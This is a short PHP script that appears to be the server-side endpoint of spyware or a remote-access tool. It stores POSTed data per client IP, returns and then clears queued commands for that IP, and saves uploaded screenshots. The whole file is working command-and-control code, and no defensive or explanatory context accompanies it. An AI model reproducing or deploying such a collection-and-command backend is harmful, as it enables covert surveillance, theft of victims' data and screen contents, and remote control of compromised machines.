<?php

$ip = $_SERVER['REMOTE_ADDR'];

$file_data = 'data/' . $ip;
$file_cmds = 'commands/' . $ip;

if (isset($_POST['d'])) {
	file_put_contents($file_data, file_get_contents($file_data) . $_POST['d']);

	echo file_get_contents($file_cmds);
	file_put_contents($file_cmds, '');
}
else if (!empty($_FILES)) {
	$uploaddir = 'screenshots/';
	$uploadfile = $uploaddir . $ip . '-' . time();
	move_uploaded_file($_FILES['s']['tmp_name'], $uploadfile);
}

?>